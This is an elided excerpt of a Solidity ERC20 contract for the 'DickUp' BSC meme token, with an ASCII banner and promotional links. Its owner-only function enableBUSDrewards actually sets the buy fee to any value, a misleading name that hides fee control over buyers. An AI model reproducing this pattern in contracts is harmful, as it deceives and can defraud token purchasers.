...
/*
 ________  ___  ________  ___  __    ___  ___  ________   
|\   ___ \|\  \|\   ____\|\  \|\  \ |\  \|\  \|\   __  \  
\ \  \_|\ \ \  \ \  \___|\ \  \/  /|\ \  \\\  \ \  \|\  \ 
 \ \  \ \\ \ \  \ \  \    \ \   ___  \ \  \\\  \ \   ____\
  \ \  \_\\ \ \  \ \  \____\ \  \\ \  \ \  \\\  \ \  \___|
...
DickUp is a community driven project, with a NFT Project coming called 'NSFW Cards'. We aim to market and develop our project to gain popularity for our token to cause it shine amongst the rest of the BSC and eventually the whole of crypto!
...
📲 Join our Telegram: https://t.me/DickUpBSC
🌍 Web: https://dickup.live/
*/
...
contract Dickup is ERC20, Ownable {
    ...
    function enableFridayHours(uint256 value) external onlyOwner{
    ...
    function enableBUSDrewards(uint256 value) external onlyOwner {
        buyFee = value;
    }
